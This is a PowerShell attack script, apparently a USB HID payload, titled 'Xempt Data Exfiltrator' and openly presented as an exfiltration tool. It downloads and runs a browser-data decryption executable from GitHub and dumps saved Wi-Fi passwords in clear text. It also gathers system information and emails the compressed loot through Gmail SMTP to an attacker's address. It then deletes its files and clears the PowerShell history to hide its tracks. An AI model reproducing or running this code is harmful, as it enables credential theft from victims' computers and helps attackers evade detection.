# Title:         Xempt Data Exfiltrator (XDE)
# Description:   Decrypts all browser data and exports to attackers email
# Author:        AnonymousXempt
# Props:         https://github.com/moonD4rk for the browser data hack
# Version:       1.0
# Category:      Exfiltration
# Target:        Windows 10 (Powershell)
# Attackmodes:   HID
# Some editing on your part is needed for EMAIL CONFIG.
# This script is for educational purposes only


#GET CURRENT LOCATION
$local = Get-Location
#DOWNLOAD AND RUN EXECUTABLE
iwr "https://github.com/AnonymousXempt/XDE/releases/download/XDE/hack-browser-data.exe" -outfile "$env:temp\XDE\hack-browser-data.exe";
start-sleep 5
.\hack-browser-data.exe

#GET WIFI PASSOWORDS
$p = "$local\results\wifi"
mkdir $p
cd $p
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File $local\results\wifi\wifipass.txt -Append -InputObject $a 
}

cd..
cd..

#ADDS COMPUTER INFO INTO HTML REPORT
get-computerinfo | format-list | out-file -filepath "$local\results\report.txt"
$content = cat $local\results\report.txt -Raw
$title = 'Report By Xempt'
$html = @"
<html>
<head><title>$title</title></head>
<body>
<pre>$content</pre>
</body>
</html>
"@
$html | Out-File 'results\report.html'

start-sleep 1
#COMPRESSES READY FOR EMAIL
cd results
attrib +r report.html
cmd /c "del /f report.txt"
cd ..
cmd /c "tar -czvf %computername%.tar.gz results"
cmd /c "rd /s /q results"
attrib +r "$env:Computername.tar.gz"
start-sleep 1

#EMAIL CONFIG
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('senders email', 'password')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'senders email'
$E.To.Add('recievers email')
$E.Subject = "$env:Computername Data Miner"
$E.Body = "Sucessfully Retrieved Data! `n Attached Is A Report Generated From Xempt Data Exfiltrator"
$F = "$env:Computername.tar.gz"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)


#CLEARING TRACKS
$E.dispose()
start-sleep 1
cmd /c "del /f hack-browser-data.exe"
cmd /c "del /f %computername%.tar.gz"
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-Item (Get-PSReadlineOption).HistorySavePath; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
cmd /c "del /f mail.ps1"
exit
